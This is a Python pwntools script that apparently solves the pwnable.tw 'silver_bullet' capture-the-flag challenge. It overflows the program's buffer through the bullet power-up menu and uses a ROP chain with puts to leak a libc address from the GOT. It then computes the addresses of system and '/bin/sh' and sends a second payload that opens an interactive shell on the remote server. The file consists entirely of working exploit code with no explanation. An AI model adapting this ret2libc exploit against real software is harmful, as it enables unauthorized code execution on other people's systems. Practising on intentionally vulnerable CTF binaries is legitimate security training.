from pwn import *

context.log_level = 'debug'

#s = process("./silver_bullet")
s = remote("chall.pwnable.tw",10103)
e = ELF("./silver_bullet")
libc = ELF("/home/junhaserv/pwn/pwnable.tw/libc_32.so (1).6")
#libc = e.libc

#pause()

def create_bullet(power):
	s.recvuntil("Your choice :")
	s.sendline("1")
	s.sendline(power)

def power_up(power):
	s.recvuntil("Your choice :")
	s.sendline("2")
	s.sendline(power)

pr = 0x8048475

create_bullet("A"*47)
power_up("A")

pay = "\xff"*4
pay += "AAA"
pay += p32(e.plt['puts'])
pay += p32(0x08048954)
pay += p32(e.got['puts'])

power_up(pay)

s.recvuntil("Your choice :")
s.sendline("3")

s.recvuntil("Your choice :")
s.sendline("3")

s.recvuntil("Oh ! You win !!\n")

leak = u32(s.recv(4))

log.success("leak : " + hex(leak))

'''
base = leak - 0x05f140
system = base + 0x03a940
binsh = base + 0x15902b
'''
base = leak - libc.symbols['puts']
system = base + libc.symbols['system']
binsh = base + next(libc.search("/bin/sh"))

create_bullet("A"*47)
power_up("A")

pay = "\xff"*4
pay += "AAA"
pay += p32(system)
pay += "AAAA"
pay += p32(binsh)

power_up(pay)

s.recvuntil("Your choice :")
s.sendline("3")

s.recvuntil("Your choice :")
s.sendline("3")

s.interactive()
